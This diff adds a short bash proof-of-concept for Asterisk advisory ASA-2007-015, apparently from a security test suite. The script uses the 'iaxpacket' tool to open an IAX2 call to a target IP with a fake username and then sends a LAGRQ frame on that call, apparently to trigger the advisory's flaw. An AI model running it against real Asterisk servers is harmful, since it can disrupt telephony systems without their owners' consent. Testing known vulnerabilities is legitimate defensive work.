@@ -1,0 +1,18 @@
+#!/bin/bash
+
+# ASA-2007-015
+# http://ftp.digium.com/pub/asa/ASA-2007-015.pdf
+
+PATH=./:$PATH
+
+if [ "x$1" = "x" ]
+then
+	echo "USAGE: asa2007015 <ipaddr[:port]>"
+	exit 1
+fi
+
+DESTIP=$1
+
+REMOTE_CALL_NUM=`iaxpacket -f FULL -t IAX2 -s NEW -S 1 -D 0 --ie_string USERNAME=fakeuser --ie_ushort VERSION=2 --ie_ulong CAPABILITY=4 --ie_ulong FORMAT=4 -i ${DESTIP} -W`
+
+iaxpacket -f FULL -t IAX2 -s LAGRQ -S 1 -D ${REMOTE_CALL_NUM} -I 1 -O 1 --ie_string USERNAME=fakeuser -i ${DESTIP}
